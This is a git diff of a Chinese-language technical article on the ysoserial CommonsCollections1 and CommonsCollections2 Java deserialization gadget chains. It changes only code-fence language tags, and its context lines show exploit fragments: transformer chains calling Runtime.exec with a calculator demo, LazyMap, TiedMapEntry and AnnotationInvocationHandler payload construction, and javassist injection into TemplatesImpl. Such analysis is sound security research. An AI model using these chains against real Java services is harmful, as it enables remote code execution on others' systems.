@@ -28,7 +28,7 @@ debug payload的过程，payload代码如果没有像ysoserial的代码一样，
 
 
 首先看poc中的这部分代码
-```
+```java
 Transformer[] transformers = new Transformer[]{
         new ConstantTransformer(Runtime.class),
 
@@ -50,7 +50,7 @@ Transformer transformerChain = new ChainedTransformer(transformers);
 漏洞涉及到的三个方法
 
 org.apache.commons.collections.functors.InvokerTransformer
-```
+```java
 public Object transform(Object input) {
     if (input == null) {
         return null;
@@ -70,13 +70,13 @@ public Object transform(Object input) {
 }
 ```
 org.apache.commons.collections.functors.ChainedTransformer
-```
+```java
 public ChainedTransformer(Transformer[] transformers) {
     this.iTransformers = transformers;
 }
 ```
 org.apache.commons.collections.functors.ChainedTransformer
-```
+```java
 public Object transform(Object object) {
     for(int i = 0; i < this.iTransformers.length; ++i) {
         object = this.iTransformers[i].transform(object);
@@ -94,7 +94,7 @@ public Object transform(Object object) {
 
 第一次循环
 
-```
+```java
 new InvokerTransformer("getMethod",
     new Class[] { String.class, Class[].class },
     new Object[] { "getRuntime", new Class[0] }),
@@ -113,7 +113,7 @@ invoke方法就相当于执行了getMethod方法获取了getRuntime方法的Meth
 
 第二次循环
 
-```
+```java
 new InvokerTransformer("invoke",
     new Class[] { Object.class, Object[].class },
     new Object[] { null, new Object[0] }),
@@ -131,7 +131,7 @@ new InvokerTransformer("invoke",
 
 第三次循环
 
-```
+```java
 new InvokerTransformer("exec",
     new Class[] { String.class },
     new Object[] { "open /Applications/Calculator.app" }),
@@ -186,13 +186,13 @@ put和putAll方法最终也会调用`valueTransformer.transform(object)`
 ![-w948](media/15662017023838/15663112607222.jpg)
 
 从`var1.isAnnotation()`可以看到AnnotationInvocationHandler构造函数的第一个参数必须是一个元注解类型,可以选择以下四种
-```
+```java
 @Target
 @Retention
 @Documented
 @Inherited
 ```
-```
+```java
 Entry var5 = (Entry)var4.next();
 String var6 = (String)var5.getKey();
 Class var7 = (Class)var3.get(var6);
@@ -206,7 +206,7 @@ if (var7 != null) {
 这里就需要var2的长度至少为1才能进入循环为memberTypes进行put操作，var1从以下方法中获得`var1.getDeclaredMethods();`，即第一个参数至少要有一个方法，而@Documented和@Inherited中没有方法，所以AnnotationInvocationHandler构造函数的第一个参数只能选择Target.class或者Retention.class,Target.class和Retention.class包含的函数名均为value,所以需要var6的值必须为`value`，也就是构造的TransformedMap中的key需要是`value`,不能是其他，然后AnnotationInvocationHandler构造函数第二个参数放入构造好的TransformedMap即outMap。
 
 构造AnnotationInvocationHandler的代码如下：
-```
+```java
 Map innerMap = new HashMap();
 innerMap.put("value", "a");
 Map outMap = TransformedMap.decorate(innerMap, null, transformerChain);
@@ -217,7 +217,7 @@ Object instance = constructor.newInstance(Target.class, outMap);
 ```
 
 生成payload的完整代码如下
-```
+```java
 private static Object createPayload() throws Exception {
     Transformer[] transformers = new Transformer[]{
             new ConstantTransformer(Runtime.class),
@@ -268,7 +268,7 @@ AnnotationInvocationHandler中的invoke方法刚好调用了输入参数的get�
 
 接下来结合漏洞poc分析下漏洞触发的流程
 
-```
+```java
 Map innerMap = new HashMap();
 Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(innerMap, transformerChain);
 Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
@@ -300,7 +300,7 @@ TiedMapEntry类的toSting方法在调用getValue方法时会对输入进来的ma
 漏洞利用的poc就很清晰了,仍然是用transformerChain构造一个LazyMap,然后利用LazyMap构造一个TiedMapEntry，随便指定一个map中不存在的key就可以了，然后利用TiedMapEntry构造BadAttributeValueExpException
 
 完整poc如下：
-```
+```java
 Map innerMap = new HashMap();
 Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(innerMap, transformerChain);
 TiedMapEntry entry = new TiedMapEntry(lazyMap, "b");
@@ -331,7 +331,7 @@ CommonsCollections2主要利用了TemplatesImpl、InvokerTransformer、Transform
 
 可能会想到那这里直接塞一个CommonsCollections1中的ChainedTransformer然后触发transform方法不是就可以了，是可以的，生成payload的方法如下
 
-```
+```java
 private static Object createPayloadByOldfunc() throws Exception {
     Transformer[] transformers = new Transformer[]{
             new ConstantTransformer(Runtime.class),
@@ -385,7 +385,7 @@ private static Object createPayloadByOldfunc() throws Exception {
 
 java中类实例化过程会首先执行静态代码块，然后执行构造代码块，然后默认执行类的无参构造方法，所以把恶意代码插入到无参构造函数中也是可以的，如下
 
-```
+```java
 String string = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");";
 CtConstructor ctConstructor = new CtConstructor(new CtClass[] {}, clazz);
 ctConstructor.setBody(string);
@@ -400,7 +400,7 @@ clazz.addConstructor(ctConstructor);
 
     可以对生成class精简一下
     
-    ```
+    ```java
     private static Object CreateTemplate() throws IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException {
         TemplatesImpl templates = TemplatesImpl.class.newInstance();
         ClassPool classPool = ClassPool.getDefault();
@@ -426,7 +426,7 @@ clazz.addConstructor(ctConstructor);
     yso生成的class如下,对应的payload有3,154 字节
     
 
-    ```
+    ```java
     //
     // Source code recreated from a .class file by IntelliJ IDEA
     // (powered by Fernflower decompiler)
@@ -462,7 +462,7 @@ clazz.addConstructor(ctConstructor);
     修改后生成的class如下，对应的payload有1,446 字节，如果将恶意代码插入到无参构造函数中只有1,356 字节会比静态代码块要小一些
     
     
-    ```
+    ```java
     import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 
     public class 20977646936963 extends AbstractTranslet {
@@ -489,7 +489,7 @@ clazz.addConstructor(ctConstructor);
 
 
 非常熟悉的newInstance，这里的input是传入ConstantTransformer的TrAXFilter.class，通过
-```
+```java
 Constructor con = ((Class) input).getConstructor(iParamTypes);
 return con.newInstance(iArgs);
 ```
